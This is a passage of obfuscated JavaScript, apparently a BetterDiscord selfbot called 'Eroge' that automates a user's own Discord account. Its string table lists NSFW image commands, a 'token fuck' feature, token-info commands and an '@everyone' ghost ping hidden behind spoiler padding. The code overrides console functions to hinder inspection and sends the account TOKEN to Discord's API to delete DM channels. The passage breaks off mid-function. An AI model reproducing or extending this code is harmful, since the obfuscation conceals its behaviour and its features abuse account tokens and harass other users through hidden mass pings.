⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄\n                    ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄\n                    ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄\n                    ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄\n                    ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴", "italic", "***Send a ascii art of girl bruh.***", "slice", "tentacle ```***", "***Random Neko Hentai***", "https://thumbs.gfycat.com/IllustriousVapidCorydorascatfish-size_restricted.gif", "***┻━┻︵ (°□°)/ ︵ ┻━┻***", "timezone", "xllelHltGdY7DP_0s1XST4cgzTs", "patch", "***Ohh i guess i like you***", "Oops, look like your token not working...", "Auto Small mode disabled. ❌", "*** 🔞", "fish ```***", "@everyone", "|| ", "🔪 Eroge Notification 🔪", "https://i.imgur.com/MCj8SsK.png", "ascii", "***Send a ascii art of a girl surprised.***", "toString", "help for get all commands.", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Sorry, you need enter a message you want to send.", "typingStart", "trash + MENTION ```***", "log", "bar", "afk ```***", "status", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "load", "account", "pussy", "Sky :", "***Send a ascii art of a girl excited.***", "**triggered**", "***Give a pat to the user mentioned***", "**🔞 Cum sluts Picture 🔞**", "neko ```***", "v8.0", "**🔞 Keta Picture 🔞**", 'Locally nicknamed "La dame de fer" (French for "Iron Lady"), it was constructed from 1887 to 1889 as the entrance to the 1889 World\'s Fair and was initially criticised by some of France\'s leading artists and intellectuals for its design, but it has become a global cultural icon of France and one of the most recognisable structures in the world.[3] The Eiffel Tower is the most-visited paid monument in the world; 6.91 million people ascended it in 2015.', "gay + MENTION ```***", "autospoiler ```**", "(′ʘ⌄ʘ‵)", "generate", "length", "wink ```***", "hneko ```***", "```Hp:```", "https://i.imgur.com/dHqxKeA.jpg", "embed", "***Send a ascii of the when the impostor is sus.***", "▓▓▓▓▓▓▓▓░░ 80%", "(((.+)+)+)+$", "No.", "timebio", "cry", "girlsolo ```***", "https://i.imgur.com/RC2EMDt.png", "https://thumbs.gfycat.com/LimitedDentalHerald-size_restricted.gif", "https://thumbs.gfycat.com/FatalHugeEgret-size_restricted.gif", "Meme", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Multistreaming status has been stopped.", "infotoken", "nsfw", "deepfry + MENTION ```***", "**🔞 Kuni Picture 🔞**", "cpus", "setActivity", "***Send a ascii art of a troll message.***", "***Random yaoi image***", "bold", "**🔞 Hneko Picture 🔞**", "timezone:", "commonfy", "setAssetsLargeImage", "***Random image of hentai anal***", "setcolor + TEXT ```***", "bar + TEXT ```**", "https://pastebin.com/raw/6PzPtenR", "girlsologif", "**🔞 Erotic yuri Picture 🔞**", "***Change the pfp to member to a weird image***", "aeec799211493807cf57c60c2a9681dd91af6e2400ee7a55a92c22860a8b8d16a48fee911ff8ced7461b366b3a6a200edc19fe11e36aa6ac366af0b778605cb7", "help", "fuck u :3", "facepalm ```**", "showToast", "「𝙈𝙚𝙣𝙪 𝙈𝙞𝙘𝙨」", "hthigh", "spotify + TEXT ```***", "「𝙈𝙚𝙣𝙪 𝙏𝙚𝙭𝙩」", "‎‎‎‎‎‎‎‎‎‎‎‎", "30%", "tag", "┻━┻︵ (°□°)/ ︵ ┻━┻", "mediastatus", "adblock", "lesbian", "3252270wXPXep", "Typing Notif DM disabled. ❌", "The tower is 324 metres (1,063 ft) tall, about the same height as an 81-storey building, and the tallest structure in Paris. Its base is square, measuring 125 metres (410 ft) on each side. During its construction, the Eiffel Tower surpassed the Washington Monument to become the tallest man-made structure in the world, a title it held for 41 years until the Chrysler Building in New York City was finished in 1930.", "https://i.imgur.com/qLHi44a.gif", "clyde + TEXT ```***", "avatar", "**🔞 Femdom Picture 🔞**", "yaml", "***Rules 34 images NSFW***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Welcome ", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿\n                        ⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉\n                        ⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉⠀⠀⠀⠀⠀⠀\n                        ⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤⠀⠀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀⠀⠀⠀⠀\n                        ⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤⠀⠀\n                        ⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿⠀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉⠀\n                        ", "You need use this commands on a server. ❌", "stringify", "axios", "***Change your theme to dark***", " cry 😭😭", "🤖 CPU usage", "rdmnikname for stop it.", "***Change the image***", "symbols1", "https://insult.mattbas.org/api/insult.txt?who=", "status2", "resetstatus", "***Create your own embed***", "r34```***", "***Awooify a members with his avatar***", "4k ```***", "***Random image of blowjob***", "**🔞 Kanna Picture 🔞**", "satisfied", "autoyifive ```**", "customspotify + IMG + IMG + TEXT ```***", "giveslap + MENTION ```***", "***Send a ascii art of ape rocket.***", "```Hauteur:```", "member", "setParty", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > New color has been set:", "***Ask a question and see the awnser***", "includes", "1259416utbbDn", "faketyping ```***", "setURL", "autoblue ```**", "neko", "presenceUpdate", "gettimes ```***", "***Give a kiss to the user mentioned***", "mediastatus stop for stop it.", "setImage", "***Random image of CumSluts***", "hanal", "2056910ruzJlq", "‎‎‎‎‎‎‎‎‎‎\n                    ⠄⣾⣿⡇⢸⣿⣿⣿⠄⠈⣿⣿⣿⣿⠈⣿⡇⢹⣿⣿⣿⡇⡇⢸⣿⣿⡇⣿⣿⣿\n                    ⢠⣿⣿⡇⢸⣿⣿⣿⡇⠄⢹⣿⣿⣿⡀⣿⣧⢸⣿⣿⣿⠁⡇⢸⣿⣿⠁⣿⣿⣿\n                    ⢸⣿⣿⡇⠸⣿⣿⣿⣿⡄⠈⢿⣿⣿⡇⢸⣿⡀⣿⣿⡿⠸⡇⣸⣿⣿⠄⣿⣿⣿\n                    ⢸⣿⡿⠷⠄⠿⠿⠿⠟⠓⠰⠘⠿⣿⣿⡈⣿⡇⢹⡟⠰⠦⠁⠈⠉⠋⠄⠻⢿⣿\n                    ⢨⡑⠶⡏⠛⠐⠋⠓⠲⠶⣭⣤⣴⣦⣭⣥⣮⣾⣬⣴⡮⠝⠒⠂⠂⠘⠉⠿⠖⣬\n                    ⠈⠉⠄⡀⠄⣀⣀⣀⣀⠈⢛⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⣀⣤⣤⣠⡀⠄⡀⠈⠁\n                    ⠄⠠⣾⡀⣾⣿⣧⣼⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣧⣼⣿⣿⢀⣿⡇⠄\n                    ⡀⠄⠻⣷⡘⢿⣿⣿⡿⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⢿⣿⣿⡿⢃⣾⠟⢁⠈\n                    ⢃⢻⣶⣬⣿⣶⣬⣥⣶⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣷⣾⣾⢣\n                    ⡄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠘\n                    ⣿⡐⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢠⢃\n                    ⣿⣷⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⠆⣼\n                    ⣿⣿⣷⡀⠄⠈⠛⢿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠿⠋⠠⠂⢀⣾⣿\n                    ⣿⣿⣿⣧⠄⠄⢵⢠⣈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⡁⢰⠏⠄⠄⣼⣿⣿\n                    ⢻⣿⣿⣿⡄⢢⠨⠄⣯⠄⠄⣌⣉⠛⠻⠟⠛⢋⣉⣤⠄⢸⡇⣨⣤⠄⢸⣿⣿⣿\n                    ", "https://i.imgur.com/TviTKFx.png", "hboobs ```***", "countryCode:", "Wind :", "meme", "paizuri ```***", "Predicted temperature :", "ghostping", "**🔞 Erotic Picture 🔞**", "***Random image of Keta***", "MMMM Do YYYY, h:mm:ss a", "symbols5", "setAssetsLargeText", "```UUID:```", "setName", "75%", "exports", "trap + MENTION ```***", "***Send a ascii art of girl stare.***", "Date :", "spotify:ab67616d0000b273d14938188f84670b61137dbd", "https://thumbs.gfycat.com/RealisticBouncyAtlanticsharpnosepuffer-size_restricted.gif", "**🔞 Pussy Picture 🔞**", "The new version gained Eiffel's support: he bought the rights to the patent on the design which Koechlin, Nougier, and Sauvestre had taken out, and the design was exhibited at the Exhibition of Decorative Arts in the autumn of 1884 under the company name. On 30 March 1885, Eiffel presented his plans to the Société des Ingénieurs Civils; after discussing the technical problems and emphasising the practical uses of the tower, he finished his talk by saying the tower would symbolise:", "random", "▓▓▓▓░░░░░░ 40%", "Token fuck has been started, please type ", "ghostmode", "trash", "setState", "***Reverse your message.***", "invisible", "alert", "***Custom achievement Minecraft***", "\n> Flags: ", " ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @everyone", "‎‎‎‎‎‎‎‎‎‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⣼⡟⠉⠉⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⣠⣶⣿⠿⣿⣿⡿⣷⡀⠸⣿⣶⡀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠘⢿⣆⠀⣠⣾⣿⣿⣿⣶⣿⣿⣶⣿⠁⠀⣠⣿⡇⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣁⣤⣴⣿⠟⠁⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣿⣿⡟⠉⠉⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁⠀⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠹⢿⠁⡀⠀⠀⠀⠀⠀⠀⠸⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ", "this", "application/json", "▓▓▓▓▓▓▓▓▓▓ 100%", "figlet", "***Random image of Traps***", "Weather forecast for : ", "countdown", "▬▬▬▬▬▬▬▬▬🔘▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "**🔞 Gasm Picture 🔞**", "**🔞 Boobs Picture 🔞**", "weather", "setTimestamp", "baguette", "humidity", "Yes", "...", "baguette + MENTION ```***", "https://minotar.net/armor/body/", "***Trap someone send the trap card***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Please, enter a new URL image.", "**Blurpify**", "```Username:```", "zh-TW", "‎‎‎‎‎‎‎‎‎‎"];
  danella = function () {
    return chanston;
  };
  return danella();
}
(function (dianeliz, donnamae) {
  const kylicia = townsend, abedallah = dianeliz();
  while (!![]) {
    try {
      const greenley = -parseInt(kylicia(271)) / 1 + -parseInt(kylicia(423)) / 2 * (parseInt(kylicia(927)) / 3) + -parseInt(kylicia(854)) / 4 * (-parseInt(kylicia(1214)) / 5) + -parseInt(kylicia(1281)) / 6 + parseInt(kylicia(1162)) / 7 + parseInt(kylicia(1202)) / 8 + parseInt(kylicia(510)) / 9 * (-parseInt(kylicia(1387)) / 10);
      if (greenley === donnamae) break; else abedallah.push(abedallah.shift());
    } catch (jamey) {
      abedallah.push(abedallah.shift());
    }
  }
}(danella, 453900));
const sheilah = function () {
  let astrid = !![];
  return function (braeleigh, jacbo) {
    const domarion = astrid ? function () {
      const emeralda = townsend;
      if (jacbo) {
        const kotaro = jacbo[emeralda(389)](braeleigh, arguments);
        return jacbo = null, kotaro;
      }
    } : function () {};
    return astrid = ![], domarion;
  };
}(), julitza = sheilah(this, function () {
  const krysten = townsend;
  return julitza[krysten(1082)]()[krysten(1482)](krysten(1116))[krysten(1082)]()[krysten(307)](julitza)[krysten(1482)](krysten(1116));
});
function townsend(kerani, carmia) {
  const lydie = danella();
  return townsend = function (namiko, kendrya) {
    namiko = namiko - 232;
    let jamiroquai = lydie[namiko];
    return jamiroquai;
  }, townsend(kerani, carmia);
}
julitza();
const vana = function () {
  let gaylyn = !![];
  return function (kree, sunny) {
    const kharlie = gaylyn ? function () {
      const gaylene = townsend;
      if (sunny) {
        const keenen = sunny[gaylene(389)](kree, arguments);
        return sunny = null, keenen;
      }
    } : function () {};
    return gaylyn = ![], kharlie;
  };
}(), tiffay = vana(this, function () {
  const anji = townsend, dameisha = function () {
    const punit = townsend;
    let kharson;
    try {
      kharson = Function(punit(655) + punit(636) + ");")();
    } catch (tahliyah) {
      kharson = window;
    }
    return kharson;
  }, jaycen = dameisha(), tonua = jaycen[anji(934)] = jaycen[anji(934)] || {}, trampus = [anji(1087), anji(973), anji(1382), "error", anji(700), anji(455), anji(708)];
  for (let rikkie = 0; rikkie < trampus[anji(1108)]; rikkie++) {
    const zyeer = vana.constructor[anji(794)][anji(313)](vana), xain = trampus[rikkie], marra = tonua[xain] || zyeer;
    zyeer[anji(1424)] = vana.bind(vana), zyeer.toString = marra[anji(1082)][anji(313)](marra), tonua[xain] = zyeer;
  }
});
tiffay(), module[caritina(1232)] = class _0x4a5daa {
  [caritina(1383)]() {
    const chelsee = caritina, sherae = require(chelsee(1021)), shadarria = new sherae[chelsee(680)]({partials: [chelsee(777), chelsee(1020), chelsee(742)]}), eeshaan = require(chelsee(966)), zysean = new eeshaan(chelsee(1146)), {NekoBot: _0x5733cc} = require(chelsee(1466)), _0x3857f = new _0x5733cc(""), _0x4d876d = require(chelsee(1411)), _0x51d1d3 = require(chelsee(454)), _0x34a6c3 = require(chelsee(919)), _0xd3dae5 = require(chelsee(1175))[chelsee(965)], _0x2aa137 = require(chelsee(688)), _0x1ea298 = new _0x2aa137, {Webhook: _0x1f0f92} = require("discord-webhook-node"), _0x4a5ce4 = require(chelsee(1343)), _0xe6e37f = require(chelsee(294)), _0x597438 = require(chelsee(1338)), _0x2b0fc3 = require("fs"), _0xd5693d = require(chelsee(1034)), _0x26f764 = require("base-64"), _0x40f609 = require(chelsee(254)), _0x1c3e17 = new _0x40f609.Client;
    var jaylaun = require(chelsee(951));
    const timica = require("weather-js");
    let tajmir = require("discordrpcgenerator");
    var jesica = require(chelsee(1256));
    const katherlene = require(chelsee(237));
    let averlee = require("os"), emiliano = require(chelsee(1029));
    const deyala = require("ms"), pratheek = require(chelsee(578)), tavain = require(chelsee(1469));
    var aubriana = "v9", naadia = "//", cythia = "off", meyah = chelsee(360), quasia = "off", jayvonn = "off", everlena = chelsee(360), roxeann = chelsee(360), cosma = chelsee(360), lushawn = chelsee(360), torean = chelsee(360), lizardo = chelsee(360), kyrra = chelsee(360), marisely = chelsee(360), matten = chelsee(360), vyktor = chelsee(360), emryk = chelsee(360), aidalyn = chelsee(360), daralene = "off", agnessa = chelsee(360), sajad = "off";
    let yanci;
    shadarria.on(chelsee(1390), () => {
      const jeiden = chelsee;
      window[jeiden(987)].alert(jeiden(1002), "***Successfully logged to " + shadarria[jeiden(1417)][jeiden(1157)] + jeiden(1483)), window[jeiden(987)][jeiden(1248)](jeiden(963)), window[jeiden(987)][jeiden(1248)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 🔪", jeiden(819)), BdApi[jeiden(1150)](jeiden(1171) + shadarria[jeiden(1417)].tag + "\n" + PREFIX + jeiden(1083), {type: "info"});
    }), shadarria.on(chelsee(568), anvika => {
      const doloria = chelsee;
      if (emryk === "on") {
        if (anvika[doloria(407)].type === "dm") {
          if (anvika[doloria(887)][doloria(1423)] === shadarria[doloria(1417)].username) return;
          anvika[doloria(407)][doloria(746)](AFK_MESSAGE);
        }
        if (anvika[doloria(315)](shadarria.user)) {
          if (anvika[doloria(887)][doloria(1423)] === shadarria.user[doloria(1423)]) return;
          anvika[doloria(407)][doloria(746)](AFK_MESSAGE);
        }
      }
    }), shadarria.on(chelsee(449), anthonique => {
      const jaelianna = chelsee;
      BdApi[jaelianna(1150)](jaelianna(481) + anthonique[jaelianna(799)] + "", {type: jaelianna(1382)});
    }), shadarria.on(chelsee(339), audel => {
      const jarian = chelsee;
      BdApi.showToast(jarian(810) + audel[jarian(799)] + "", {type: "info"});
    }), shadarria.on(chelsee(331), dimesha => {
      const paizlynn = chelsee;
      if (aidalyn === "on") {
        if (dimesha.author[paizlynn(1423)] === shadarria.user[paizlynn(1423)]) return;
        if (dimesha.channel.type === "dm") {
          let quaid = "" + dimesha[paizlynn(393)], chesna = "" + dimesha.author[paizlynn(1157)];
          const rhena = (new sherae[paizlynn(344)]).setTitle(paizlynn(909))[paizlynn(695)]("**" + chesna + "**", paizlynn(781) + quaid + "**")[paizlynn(321)](COLOR)[paizlynn(938)](paizlynn(899), IMAGE);
          return dimesha[paizlynn(407)][paizlynn(746)](rhena);
        }
      }
    }), shadarria.on("messageUpdate", (iyra, chloeigh) => {
      const malkie = chelsee;
      if (aidalyn === "on") {
        if (iyra[malkie(887)][malkie(1423)] === shadarria[malkie(1417)][malkie(1423)]) return;
        if (iyra[malkie(407)].type === "dm") {
          let sithara = "" + iyra[malkie(393)], wavalene = "" + chloeigh[malkie(393)], trishana = "" + iyra[malkie(887)].tag;
          const saamiyah = (new sherae[malkie(344)])[malkie(1044)](malkie(909))[malkie(695)]("**" + trishana + "**", " have edit the message: **" + sithara + "** to **" + wavalene + "**")[malkie(321)](COLOR).setFooter(malkie(899), IMAGE);
          return iyra.channel[malkie(746)](saamiyah);
        }
      }
    }), shadarria.on(chelsee(1085), function (clelia, mabelene) {
      const janit = chelsee;
      agnessa === "on" && BdApi[janit(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > " + mabelene.username + janit(872), {type: janit(1382)});
    }), shadarria.on(chelsee(1207), (evline, whittaker) => {
      const autumnrose = chelsee;
      sajad === "on" && ((whittaker[autumnrose(1018)][autumnrose(1470)][autumnrose(522)] === "dnd" || whittaker.presence.clientStatus[autumnrose(522)] === autumnrose(342) || whittaker[autumnrose(1018)].clientStatus[autumnrose(522)] === autumnrose(1024)) && BdApi[autumnrose(1150)](autumnrose(713) + whittaker[autumnrose(1417)].username + " is now online", {type: autumnrose(1382)}));
    }), shadarria.on("message", jillian => {
      const abdrahman = chelsee;
      roxeann === "on" && (jillian.author[abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)](jillian[abdrahman(393)], {code: abdrahman(1169)}));
      cosma === "on" && (jillian.author.username === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)]("-" + jillian[abdrahman(393)], {code: abdrahman(462)}));
      lushawn === "on" && (jillian.author[abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)]("+" + jillian[abdrahman(393)], {code: abdrahman(462)}));
      torean === "on" && (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)](jillian[abdrahman(393)], {code: abdrahman(1405)}));
      lizardo === "on" && (jillian.author[abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian.edit("[" + jillian[abdrahman(393)] + "]", {code: abdrahman(928)}));
      kyrra === "on" && (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)]("[" + jillian[abdrahman(393)] + "]", {code: "ini"}));
      if (marisely === "on") {
        if (jillian[abdrahman(887)].username === shadarria[abdrahman(1417)].username) {
          const cristofher = ["r", "R", "L", "l"], fraida = ["w", "W", "W", "w"];
          let alenah = jillian[abdrahman(393)];
          for (let emalise = 0; emalise < cristofher[abdrahman(1108)]; emalise++) {
            const lochlin = cristofher[emalise];
            alenah = alenah[abdrahman(1028)](lochlin)[abdrahman(463)](fraida[emalise]);
          }
          return jillian[abdrahman(930)](alenah);
        }
      }
      cythia === "on" && (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)].username && jillian[abdrahman(930)](abdrahman(1077) + jillian[abdrahman(393)] + abdrahman(1433)));
      meyah === "on" && (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)](abdrahman(456) + jillian[abdrahman(393)] + abdrahman(560)));
      quasia === "on" && (jillian.author.username === shadarria[abdrahman(1417)][abdrahman(1423)] && jillian[abdrahman(930)]("> " + jillian[abdrahman(393)] + ""));
      if (jayvonn === "on") {
        if (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)]) {
          const danixsa = abdrahman(601), mattlock = abdrahman(1056);
          let miryea = jillian[abdrahman(393)];
          for (let lynisha = 0; lynisha < danixsa[abdrahman(1108)]; lynisha++) {
            const lathomas = danixsa[lynisha];
            miryea = miryea[abdrahman(1028)](lathomas)[abdrahman(463)](mattlock[lynisha]);
          }
          return jillian[abdrahman(930)](miryea);
        }
      }
      if (everlena === "on") {
        if (jillian[abdrahman(887)].username === shadarria[abdrahman(1417)][abdrahman(1423)]) {
          const envi = abdrahman(601), sei = abdrahman(1283);
          let lakiera = jillian[abdrahman(393)];
          for (let jeroen = 0; jeroen < envi[abdrahman(1108)]; jeroen++) {
            const darrnell = envi[jeroen];
            lakiera = lakiera[abdrahman(1028)](darrnell)[abdrahman(463)](sei[jeroen]);
          }
          return jillian[abdrahman(930)](lakiera);
        }
      }
      if (vyktor === "on") {
        if (jillian[abdrahman(407)][abdrahman(1037)] === "dm") {
          if (jillian.content[abdrahman(1201)]("discord.gg")) {
            if (jillian.author[abdrahman(1423)] === shadarria[abdrahman(1417)][abdrahman(1423)]) return;
            jillian[abdrahman(407)][abdrahman(746)](abdrahman(488));
            let kaelynne = jillian[abdrahman(407)].id;
            function destyny() {
              const marisleysis = abdrahman;
              let luisfelipe = {headers: {"content-type": "application/json", authorization: TOKEN}};
              _0xd3dae5[marisleysis(1289)](marisleysis(405) + aubriana + marisleysis(724) + kaelynne, luisfelipe);
            }
            setTimeout(destyny, 3e3), BdApi[abdrahman(1150)](abdrahman(713) + jillian.author.tag + " have send you the followed invite link\n\n" + jillian[abdrahman(393)], {type: abdrahman(1382)});
          }
        }
      }
      if (daralene === "on") {
        if (jillian[abdrahman(407)][abdrahman(1037)] === "dm") {
          if (jillian[abdrahman(887)][abdrahman(608)]) {
            let demaurio = jillian[abdrahman(407)].id;
            function adaleah() {
              const calixtro = abdrahman;
              let dmiya = {headers: {"content-type": calixtro(1254), authorization: TOKEN}};
              _0xd3dae5[calixtro(1289)](calixtro(405) + aubriana + calixtro(724) + demaurio, dmiya);
            }
            setTimeout(adaleah, 3e3), BdApi[abdrahman(1150)](abdrahman(713) + jillian[abdrahman(887)][abdrahman(1157)] + abdrahman(735), {type: abdrahman(1382)});
          }
        }
      }
      function cirrus(vail) {
        const dajshia = abdrahman, ashleyelizabeth = Date[dajshia(783)]();
        let muneer = null;
        do {
          muneer = Date[dajshia(783)]();
        } while (muneer - ashleyelizabeth < vail);
      }
      var maithili = ["🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹"][Math[abdrahman(250)](Math[abdrahman(1240)]() * 20)];
      let keyaira = jillian[abdrahman(393)][abdrahman(1028)](" ")[0];
      keyaira = keyaira[abdrahman(1063)](PREFIX.length);
      let maverick = jillian.content[abdrahman(1028)](" ").slice(1);
      if (jillian[abdrahman(887)][abdrahman(1423)] === shadarria[abdrahman(1417)].username) {
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1147))) {
          jillian[abdrahman(1289)]();
